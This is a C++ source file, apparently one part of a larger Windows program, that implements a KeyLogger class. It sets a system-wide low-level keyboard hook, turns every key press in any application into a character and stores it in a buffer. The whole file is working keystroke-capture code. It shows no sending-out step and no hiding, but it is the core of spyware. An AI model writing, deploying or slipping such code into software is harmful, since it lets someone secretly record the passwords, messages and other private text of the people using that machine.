#include "StdAfx.h"
#include "KeyLogger.h"

KeyLogger *KeyLogger::m_pInstance = NULL;
KeyLogger* KeyLogger::GetInstance()
{
	if (m_pInstance == NULL)
	{
		m_pInstance = new KeyLogger();
	}
	return m_pInstance;
}

KeyLogger::KeyLogger()
{
	this->m_pBuffer = NULL;
	this->m_pConverter = new VirtulKeyCodeToCharConverter();
}

KeyLogger::~KeyLogger(void)
{
	Disable();
	delete m_pConverter;
}

void KeyLogger::SetBuffer(Buffer *buffer)
{
	this->m_pBuffer = buffer;
}

Buffer* KeyLogger::GetBuffer()
{
	return this->m_pBuffer;
}

LRESULT CALLBACK KeyLogger::onKeybordEvent(int code,WPARAM wParam,LPARAM lParam) 
{  
	switch(wParam)
	{
	case WM_KEYDOWN:		
	case WM_SYSKEYDOWN:
		KeyLogger::GetInstance()->addToBuffer((KBDLLHOOKSTRUCT*)lParam);
	break;
	case WM_KEYUP:
	case WM_SYSKEYUP:
		break;
	}
	
	return CallNextHookEx( KeyLogger::GetInstance()->m_hhk ,code,wParam,lParam);
}
void KeyLogger::OnEnable()
{
	m_hhk = SetWindowsHookEx(WH_KEYBOARD_LL,onKeybordEvent, myInstance, NULL);
	m_pConverter->LoadKeyboardLayoutW();
}
void KeyLogger::OnDisable()
{
	UnhookWindowsHookEx(m_hhk);
	m_hhk = NULL;
	m_pConverter->UnloadKeyboardLayout();
}

void KeyLogger::addToBuffer(KBDLLHOOKSTRUCT *keyStruct)
{
	// Load m_keyChar with the char.
	if (m_pConverter->ConvertToWChar(keyStruct->vkCode, (PTCHAR)&m_keyChar, (PTCHAR)&m_deadKeyChar))
	{
		m_pBuffer->Add(m_keyChar);
	}
}
